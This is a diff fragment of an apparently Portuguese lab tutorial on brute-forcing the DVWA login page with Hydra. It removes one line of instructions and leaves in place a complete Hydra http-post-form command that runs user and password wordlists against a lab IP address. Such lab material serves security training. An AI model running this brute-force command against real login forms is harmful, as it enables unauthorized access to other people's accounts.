@@ -143,8 +143,6 @@ O Hydra é mais direto e compatível com formulários HTTP/POST (http-post-form)
  - Texto exibido em caso de falha (ex.: Login failed) — essa é a fail string.
 
 4.4 Comando Hydra
-
-Execute do diretório onde estão `users.txt` e `pass.txt`:
 ```
 hydra -L users.txt -P pass.txt 192.168.56.101 http-post-form "/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed"
 ```
